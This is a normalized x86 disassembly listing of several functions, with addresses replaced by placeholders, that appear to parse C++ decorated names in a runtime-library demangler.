cmp [ ebp - 0x7c ] 0x1
pop ecx
pop ecx
jg r-xdata
lea eax [ ebp - 0x98 ]
push eax
call sub_42e1de
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_42d2c8
push 0x2c
lea ecx [ ebp - 0x80 ]
call sub_42d52f
dec edi
je r-xdata
mov ecx eax
call sub_42d4e7
jmp r-xdata
push 0x1
mov ecx esi
call sub_42ccad
jmp r-xdata
cmp [ ebp - 0x84 ] 0x1
jg r-xdata
lea eax [ ebp - 0xb8 ]
push eax
call sub_42e1de
pop ecx
push eax
lea ecx [ ebp - 0x80 ]
call sub_42d2c8
dec edi
je r-xdata
push 0x64
lea eax [ ebp - 0x77 ]
push eax
lea ecx [ ebp - 0x80 ]
call sub_42ccf2
test eax eax
jne r-xdata
dec edi
jne r-xdata
mov al [ ebp - 0x77 ]
mov [ ebp - 0x78 ] al
cmp al 0x2d
jne r-xdata
push 0x7d
push esi
lea ecx [ ebp - 0x80 ]
call sub_42d7ab
jmp r-xdata
mov [ ebp - 0x77 ] 0x2e
mov al [ ebp - 0x76 ]
mov [ ebp - 0x77 ] al
mov [ ebp - 0x76 ] 0x2e
jmp r-xdata
lea eax [ ebp - 0x88 ]
push eax
push esi
push 0x65
lea eax [ ebp - 0xa0 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0xc0 ]
call sub_42d09f
mov ecx eax
call sub_42d7ab
sub_42e520
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
xor ecx ecx
sub esp 0x18
cmp [ eax ] cl
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_42d763
cmp [ ebp + 0x10 ] ecx
je r-xdata
cmp [ eax ] 0x59
jne r-xdata
cmp [ eax ] 0x58
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push esi
push eax
call sub_431381
mov eax [ esi + 0x4 ]
pop ecx
pop ecx
pop esi
test eax 0x4000
je r-xdata
push [ ebp + 0xc ]
inc eax
push [ ebp + 0x8 ]
mov [ rw-data ] eax
call sub_42dd57
pop ecx
pop ecx
jmp r-xdata
inc eax
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] ecx
jne r-xdata
test eax 0x2000
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
mov eax [ ebp + 0x8 ]
leave
retn
push eax
push r--data
push [ ebp + 0x8 ]
call sub_42d787
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_42d09f
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
leave
retn
add esp 0xc
lea ecx [ ebp - 0x18 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
jmp r-xdata
sub_42e61e
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] 0xffff00ff
mov [ esi ] ebx
mov [ rw-data ] 0x1
mov [ ebp - 0x20 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
mov [ rw-data ] bl
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
push edi
mov edi 0xffff0000
pop edi
cmp cl 0x40
je r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_42d52f
mov eax [ rw-data ]
mov [ ebp - 0x20 ] ebx
jmp r-xdata
and [ ebp - 0x18 ] edi
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x1c ] ebx
cmp dl 0x58
jne r-xdata
inc eax
mov [ rw-data ] eax
push ecx
mov ecx [ rw-data ]
lea eax [ ebp - 0x74 ]
push eax
call sub_42ce67
jmp r-xdata
mov dl [ eax ]
movsx ecx dl
sub ecx 0x30
cmp ecx 0x9
ja r-xdata
cmp dl 0x24
jne r-xdata
inc eax
mov [ rw-data ] eax
push r--data
push eax
mov ecx esi
call sub_42d2c8
cmp [ esi + 0x4 ] bl
je r-xdata
cmp dl 0x3f
jne r-xdata
inc eax
cmp [ eax ] dl
je r-xdata
mov eax [ rw-data ]
sub eax [ ebp - 0x44 ]
cmp eax 0x1
jle r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
cmp cl bl
je r-xdata
and [ ebp - 0x3c ] edi
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x40 ] ebx
call sub_431744
pop ecx
lea eax [ ebp - 0x38 ]
push eax
call sub_42e1de
test [ rw-data ] 0x4000
pop ecx
je r-xdata
mov [ rw-data ] eax
lea eax [ ebp - 0x7c ]
push eax
call sub_42e230
jmp r-xdata
lea eax [ ebp - 0x1c ]
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x50 ]
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
call sub_42d581
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x2c ]
jmp r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x38 ]
call sub_42ccf2
lea eax [ ebp - 0x14 ]
push eax
call sub_437d67
push eax
call [ rw-data ]
pop ecx
pop ecx
cmp eax ebx
je r-xdata
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
lea eax [ ebp - 0x1c ]
push eax
call sub_42ce1d
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push r--data
lea ecx [ ebp - 0x5c ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x48 ]
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
call sub_42d581
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
jmp r-xdata
push eax
jmp r-xdata
lea ecx [ ebp - 0x1c ]
call sub_42d39f
jmp r-xdata
sub_42e82d
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
movsx edx [ eax ]
push ebx
xor ebx ebx
mov ecx 0xffff0000
and [ ebp - 0x4 ] ecx
and [ ebp - 0xc ] ecx
push esi
xor esi esi
inc eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ rw-data ] eax
cmp edx 0x41
jg r-xdata
cmp edx 0x42
je r-xdata
je r-xdata
xor esi esi
inc esi
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_42d39f
cmp esi ebx
je r-xdata
cmp edx ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
mov [ eax ] ebx
jmp r-xdata
cmp edx 0x5a
jle r-xdata
dec eax
mov [ rw-data ] eax
cmp edx 0x2f
jle r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push r--data
lea ecx [ ebp - 0x30 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0x200
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp edx 0x5f
jne r-xdata
cmp edx 0x31
jle r-xdata
movsx ecx [ eax ]
inc eax
mov [ rw-data ] eax
cmp ecx 0x4f
jg r-xdata
and [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
cmp edx 0x39
jg r-xdata
cmp ecx 0x54
jg r-xdata
cmp ecx 0x44
jge r-xdata
push ebx
mov esi eax
lea eax [ ebp - 0x90 ]
push ebx
push eax
call sub_42ef5a
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov [ rw-data ] esi
cmp ecx ebx
je r-xdata
lea eax [ ebp - 0x88 ]
push eax
call sub_42e61e
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x3c
lea ecx [ ebp - 0x20 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_42d2c8
mov ecx [ ebp - 0x10 ]
cmp ecx ebx
je r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
cmp ecx 0x55
jl r-xdata
cmp ecx 0x53
jge r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x39
jg r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ esi - 0x1 ] 0x31
jne r-xdata
push 0x3e
lea ecx [ ebp - 0x10 ]
call sub_42d52f
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp al 0x3e
jne r-xdata
cmp ecx 0x56
jle r-xdata
sub ecx 0x50
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_42d09f
jmp r-xdata
cmp ecx 0x3f
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x7e
lea ecx [ ebp - 0x28 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] bl
jne r-xdata
mov [ eax ] 0x1
push 0x20
lea ecx [ ebp - 0x10 ]
call sub_42d52f
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x57
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_42d39f
push ebx
lea eax [ ebp - 0x70 ]
push ebx
push eax
call sub_42e82d
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
cmp ecx ebx
je r-xdata
dec ecx
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
movsx ecx [ eax ]
inc eax
mov [ rw-data ] eax
cmp ecx ebx
je r-xdata
cmp ecx 0x40
jle r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x20 ]
call sub_42d09f
mov ecx [ ebp - 0x1c ]
or ecx 0x8000
cmp ecx ebx
je r-xdata
inc eax
mov [ rw-data ] eax
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_42d39f
cmp ecx 0x59
jle r-xdata
lea ecx [ ebp - 0x8 ]
test eax 0x400
je r-xdata
dec ecx
jne r-xdata
cmp ecx 0x30
jne r-xdata
cmp ecx 0x42
jle r-xdata
mov [ eax + 0x4 ] ecx
cmp ecx 0x2f
jle r-xdata
cmp ecx 0x5f
jne r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x8 ]
call sub_42d39f
mov eax [ rw-data ]
mov al [ eax ]
cmp al bl
jne r-xdata
push ebx
push r--data
jmp r-xdata
cmp ecx 0x43
jne r-xdata
cmp ecx 0x36
jle r-xdata
movsx ecx [ eax ]
inc eax
mov [ rw-data ] eax
cmp ecx 0x41
jl r-xdata
movsx eax al
sub eax 0x30
js r-xdata
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_42d2a4
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_42e12b
mov ecx [ ebp - 0x1c ]
add esp 0xc
or ecx 0x1000
jmp r-xdata
push 0x1
push r--data
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x38
jg r-xdata
cmp ecx 0x44
jle r-xdata
cmp eax 0x5
jae r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
jmp r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp ecx 0x46
jle r-xdata
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x10 ]
call sub_42d39f
mov eax [ rw-data ]
movsx eax [ eax ]
inc [ rw-data ]
cmp eax 0x30
je r-xdata
movsx eax [ eax - 0x1 ]
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x18 ]
call sub_42d09f
mov eax [ rw-data ]
cmp [ eax ] 0x3f
jne r-xdata
cmp ecx 0x4a
jg r-xdata
lea eax [ ebp - 0x28 ]
push ebx
push eax
call sub_4318f5
mov eax [ ebp - 0x28 ]
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
push 0x20
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_42d52f
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_42d2c8
lea ecx [ ebp - 0x20 ]
jmp r-xdata
cmp eax 0x31
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_42f374
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
lea eax [ ebp - 0x80 ]
push eax
call sub_430114
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_42d4e7
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
push 0x2c
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_42e1de
pop ecx
mov ecx eax
call sub_42d7ab
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
push 0x2c
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call sub_42e1de
pop ecx
mov ecx eax
call sub_42d7ab
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
push 0x2c
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_42e1de
pop ecx
mov ecx eax
call sub_42d7ab
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
push 0x29
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x60 ]
push ebx
push eax
call sub_42d7f3
pop ecx
pop ecx
mov ecx eax
call sub_42d7ab
push eax
lea ecx [ ebp - 0x18 ]
call sub_42d2c8
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_42d7ab
jmp r-xdata
add eax 0xffffffce
cmp eax 0x2
jbe r-xdata
push r--data
lea ecx [ ebp - 0x18 ]
call sub_42d581
mov ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x14 ]
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
dec [ rw-data ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_42ccad
sub_42ee03
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xa8
cmp [ eax ] 0x3f
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
cmp [ eax + 0x1 ] 0x24
jne r-xdata
or [ ebp - 0x50 ] 0xffffffff
or [ ebp - 0x7c ] 0xffffffff
or [ ebp - 0xa8 ] 0xffffffff
push ebx
mov ebx [ rw-data ]
push esi
mov esi [ rw-data ]
lea ecx [ ebp - 0x50 ]
mov [ rw-data ] ecx
lea ecx [ ebp - 0x7c ]
push edi
mov edi [ rw-data ]
mov [ rw-data ] ecx
add eax 0x2
lea ecx [ ebp - 0xa8 ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
cmp [ eax ] 0x3f
mov [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_42ef5a
inc eax
mov [ rw-data ] eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_42e82d
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ rw-data ] edi
pop edi
mov [ rw-data ] esi
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
pop esi
mov [ rw-data ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push eax
call sub_42e61e
pop ecx
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x3c
lea ecx [ ebp - 0x24 ]
call sub_42d072
mov ecx eax
call sub_42d4e7
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_42d2c8
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
push 0x3e
lea ecx [ ebp - 0xc ]
call sub_42d52f
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ecx ]
call [ eax + 0x4 ]
cmp al 0x3e
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
lea ecx [ ebp - 0xc ]
call sub_42d52f
inc [ rw-data ]
sub_42ef5a
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rw-data ]
mov cl [ ebx ]
movsx eax cl
push esi
mov esi [ ebp + 0x8 ]
sub eax 0x30
mov [ ebp - 0x38 ] esi
cmp eax 0x9
ja r-xdata
and [ ebp - 0x1c ] 0x0
push edi
mov edi 0xffff0000
and [ ebp - 0x18 ] edi
cmp cl 0x3f
jne r-xdata
mov ecx [ rw-data ]
push eax
inc ebx
push esi
mov [ rw-data ] ebx
call sub_42ce67
mov eax esi
jmp r-xdata
mov eax r--data
mov esi eax
mov ecx ebx
mov [ ebp - 0x20 ] 0x12
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_42ee03
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
inc eax
mov [ rw-data ] eax
cmp cl 0x40
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
movzx ecx [ ecx ]
movzx edx [ esi ]
sub ecx edx
jne r-xdata
cmp dl [ esi ]
jne r-xdata
cmp [ ebp + 0xc ] 0x0
pop edi
je r-xdata
dec eax
xor ecx ecx
mov [ rw-data ] eax
cmp [ eax ] cl
setne cl
inc ecx
push ecx
lea ecx [ ebp - 0x1c ]
call sub_42cde6
jmp r-xdata
mov eax r--data
push 0xc
mov ecx ebx
mov esi eax
pop ebx
add ebx 0x13
mov [ rw-data ] ebx
jmp r-xdata
inc ecx
inc esi
dec [ ebp - 0x20 ]
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x38 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
movzx ecx [ ecx ]
movzx edx [ esi ]
sub ecx edx
jne r-xdata
cmp dl [ esi ]
jne r-xdata
mov esi eax
lea eax [ ebp - 0x24 ]
push eax
call sub_42e1de
test [ rw-data ] 0x4000
pop ecx
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
call sub_42ce1d
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add [ rw-data ] 0xd
inc ecx
inc esi
dec ebx
jne r-xdata
lea ecx [ ebp - 0x1c ]
push 0x10
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_42ccf2
lea eax [ ebp - 0x14 ]
push eax
call sub_437d67
push eax
call [ rw-data ]
pop ecx
pop ecx
lea ecx [ ebp - 0x1c ]
test eax eax
je r-xdata
push 0x40
push rw-data
lea ecx [ ebp - 0x34 ]
call sub_42d0dc
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
push r--data
call sub_42d39f
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push esi
lea ecx [ ebp - 0x34 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
push r--data
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
call sub_42d581
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x1c ]
call sub_42d2c8
jmp r-xdata
push eax
call sub_42d39f
jmp r-xdata
mov ecx [ ebp - 0x30 ]
xor eax eax
and ecx edi
inc [ rw-data ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
jmp r-xdata
sub_42f170
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
push ebx
lea eax [ ebp - 0x8 ]
push 0x1
mov [ esi + 0x4 ] bl
mov edi 0xffff00ff
and [ esi + 0x4 ] edi
push eax
mov [ esi ] ebx
call sub_42ef5a
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
add esp 0xc
mov [ esi + 0x4 ] eax
cmp al bl
jne r-xdata
mov eax [ rw-data ]
mov al [ eax ]
cmp al 0x40
jne r-xdata
mov eax [ rw-data ]
mov al [ eax ]
cmp al bl
je r-xdata
cmp al bl
je r-xdata
inc [ rw-data ]
jmp r-xdata
cmp al 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
and [ esi + 0x4 ] edi
mov [ esi + 0x4 ] 0x2
mov [ esi ] ebx
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
push esi
lea eax [ ebp - 0x8 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_430382
pop ecx
mov ecx eax
call sub_42d7cf
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push esi
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_42ccad
mov ecx eax
call sub_42d7cf
mov ecx eax
call sub_42d4e7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push 0x1
mov ecx esi
call sub_42cde6
jmp r-xdata
sub_42f264
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x20
push esi
push edi
mov ecx eax
shr ecx 0xf
xor edi edi
not ecx
inc edi
and ecx edi
je r-xdata
xor edi edi
test eax 0x1000
je r-xdata
mov ecx [ ebp + 0x8 ]
dec [ rw-data ]
push r--data
call sub_42d09f
mov eax [ ebp + 0x8 ]
sub eax 0x54
je r-xdata
mov eax [ rw-data ]
movsx eax [ eax ]
and [ ebp - 0x8 ] 0x0
mov esi 0xffff0000
and [ ebp - 0x4 ] esi
inc [ rw-data ]
sub eax 0x0
je r-xdata
push r--data
dec eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_42f170
pop ecx
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_42d2c8
mov ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r--data
jmp r-xdata
dec eax
je r-xdata
pop edi
pop esi
leave
retn
lea ecx [ ebp - 0x8 ]
call sub_42d39f
push r--data
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov edi ecx
call sub_42d939
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_42d09f
mov ecx eax
call sub_42d4e7
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
dec eax
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] esi
test edi edi
je r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push r--data
jmp r-xdata
sub_42f374
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp [ eax ] 0x3f
jne r-xdata
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_42ef5a
inc eax
cmp [ eax ] 0x24
jne r-xdata
push 0x0
push 0x0
push [ ebp + 0x8 ]
mov [ rw-data ] eax
call sub_42e82d
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_42ee03
pop ecx
pop ecx
jmp r-xdata
add esp 0xc
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_42f3be
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
call sub_42c6d9
add esp 0x4
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d09f
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_42cfad
movsx ecx [ eax ]
inc eax
mov [ rw-data ] eax
mov eax ecx
sub eax 0x30
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_42d581
jmp r-xdata
dec eax
dec eax
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_42d581
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn
lea eax [ ebp - 0x10 ]
push eax
call sub_42f170
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_42d2c8
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
sub_42f45a
mov edi edi
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
xor edi edi
mov esi 0xffff0000
and [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] edi
call sub_42c121
mov ecx [ ebp + 0xc ]
mov ebx eax
cmp [ ecx ] edi
je r-xdata
mov [ ebp - 0x14 ] edi
test [ ecx + 0x4 ] 0x200
mov [ ebp - 0x14 ] 0x1
jne r-xdata
cmp ebx 0xfffe
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
mov [ eax + 0x4 ] 0x2
mov [ eax ] edi
jmp r-xdata
cmp ebx 0xffff
jne r-xdata
cmp ebx 0xfffd
jne r-xdata
push ecx
push 0x1
push [ ebp + 0x8 ]
call sub_42d763
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
and [ ebp - 0x4 ] 0x8000
mov edi 0x1800
